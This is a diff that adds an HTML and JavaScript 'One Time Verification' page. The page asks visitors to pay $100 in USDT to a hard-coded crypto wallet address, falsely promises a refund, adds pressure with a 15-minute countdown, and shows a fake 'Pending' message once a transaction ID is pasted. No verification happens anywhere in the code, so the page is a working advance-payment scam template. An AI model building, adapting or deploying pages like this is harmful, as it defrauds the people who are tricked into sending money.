@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Verification</title>
+
+<style>
+body {
+  font-family: 'Segoe UI', sans-serif;
+  background: #121212;
+  color: #fff;
+  padding: 40px 20px;
+}
+
+.container {
+  max-width: 500px;
+  margin: auto;
+  background: #1e1e2e;
+  border-radius: 10px;
+  padding: 30px;
+  box-shadow: 0 0 15px rgba(0,0,0,0.4);
+  border-top: 5px solid;
+  border-image: linear-gradient(to right, red, orange, yellow) 1;
+}
+
+h2 {
+  text-align: center;
+  margin-bottom: 20px;
+  background: linear-gradient(90deg, #00fff0, #00aaff);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+
+p { text-align:center; color:#ccc; }
+
+button {
+  width: 100%;
+  padding: 12px;
+  margin-top: 15px;
+  border: none;
+  border-radius: 8px;
+  font-size: 16px;
+  background: linear-gradient(to right, #ffaa00, #ff6600);
+  color: #000;
+  font-weight: bold;
+  cursor: pointer;
+}
+
+.hidden { display: none !important; }
+
+/* Loader */
+.loader {
+  border: 4px solid #2e2e3e;
+  border-top: 4px solid #00aaff;
+  border-radius: 50%;
+  width: 50px;
+  height: 50px;
+  animation: spin 1s linear infinite;
+  margin: 30px auto;
+}
+@keyframes spin { 100% { transform: rotate(360deg);} }
+
+/* Payment */
+.address {
+  background: #2e2e3e;
+  padding: 10px;
+  border-radius: 6px;
+  text-align: center;
+  word-break: break-word;
+}
+
+.copy-btn {
+  margin-top: 10px;
+  background: #00aaff;
+}
+
+input {
+  width: 100%;
+  padding: 12px;
+  margin-top: 15px;
+  border-radius: 8px;
+  border: none;
+  background: #2e2e3e;
+  color: #fff;
+}
+
+/* Timer */
+.timer {
+  text-align: center;
+  margin-top: 10px;
+  color: #ffcc00;
+  font-size: 18px;
+}
+
+/* Toast */
+.toast {
+  position: fixed;
+  bottom: 20px;
+  right: 20px;
+  background: #1e1e2e;
+  padding: 15px 20px;
+  border-radius: 8px;
+  border-left: 5px solid #00ff99;
+  opacity: 0;
+  transform: translateY(20px);
+  transition: 0.3s;
+}
+.toast.show {
+  opacity: 1;
+  transform: translateY(0);
+}
+
+/* Modal */
+.modal {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.7);
+  display: none;
+  justify-content: center;
+  align-items: center;
+}
+
+.modal.active {
+  display: flex;
+}
+
+.modal-content {
+  background: #1e1e2e;
+  padding: 25px;
+  border-radius: 10px;
+  text-align: center;
+}
+
+/* Icon */
+.icon {
+  width: 50px;
+  height: 50px;
+  margin-bottom: 10px;
+}
+</style>
+</head>
+
+<body>
+
+<!-- MAIN -->
+<div id="mainPage" class="container">
+  <h2>One Time Verification</h2>
+  <p>Verify ownership. Amount will be refunded.</p>
+  <button onclick="startLoading()">Pay $100 Now</button>
+</div>
+
+<!-- LOADING -->
+<div id="loadingPage" class="container hidden">
+  <div class="loader"></div>
+  <p>Loading Payment...</p>
+</div>
+
+<!-- PAYMENT -->
+<div id="paymentPage" class="container hidden">
+  <h2>Complete Verification</h2>
+
+  <div class="timer" id="timer">15:00</div>
+
+  <div>USDT BEP20</div>
+
+  <div class="address" id="wallet">
+    0x9B8f455096f8c91aD882227074a38D9578f701fB
+  </div>
+
+  <button class="copy-btn" onclick="copyAddress()">Copy Address</button>
+
+  <input type="text" id="tid" placeholder="Paste Transaction ID">
+
+  <button onclick="submitTx()">Submit</button>
+</div>
+
+<!-- MODAL -->
+<div id="modal" class="modal">
+  <div class="modal-content">
+    
+    <!-- SVG ICON -->
+    <svg class="icon" viewBox="0 0 24 24" fill="#00aaff">
+      <path d="M12 2a10 10 0 100 20 10 10 0 000-20zm1 5h-2v6l5 3 1-1-4-2V7z"/>
+    </svg>
+
+    <h3>Pending</h3>
+    <p>You will receive email once verified.</p>
+  </div>
+</div>
+
+<!-- TOAST -->
+<div id="toast" class="toast"></div>
+
+<script>
+let timerInterval;
+
+function startLoading() {
+  document.getElementById("mainPage").classList.add("hidden");
+  document.getElementById("loadingPage").classList.remove("hidden");
+
+  setTimeout(() => {
+    document.getElementById("loadingPage").classList.add("hidden");
+    document.getElementById("paymentPage").classList.remove("hidden");
+    startTimer(15 * 60);
+  }, 2000);
+}
+
+function startTimer(duration) {
+  let time = duration;
+  const display = document.getElementById("timer");
+
+  timerInterval = setInterval(() => {
+    let min = Math.floor(time / 60);
+    let sec = time % 60;
+
+    display.textContent =
+      String(min).padStart(2, '0') + ":" + String(sec).padStart(2, '0');
+
+    if (--time < 0) {
+      clearInterval(timerInterval);
+      display.textContent = "Expired";
+    }
+  }, 1000);
+}
+
+function copyAddress() {
+  const text = document.getElementById("wallet").innerText;
+  navigator.clipboard.writeText(text);
+  showToast("Address copied");
+}
+
+function submitTx() {
+  const tid = document.getElementById("tid").value.trim();
+
+  if (!tid) {
+    showToast("Enter Transaction ID", true);
+    return;
+  }
+
+  // SHOW MODAL ONLY HERE ✅
+  document.getElementById("modal").classList.add("active");
+}
+
+function showToast(msg, error=false) {
+  const t = document.getElementById("toast");
+  t.innerText = msg;
+  t.style.borderLeftColor = error ? "#ff4444" : "#00ff99";
+  t.classList.add("show");
+
+  setTimeout(() => t.classList.remove("show"), 3000);
+}
+</script>
+
+</body>
+</html>
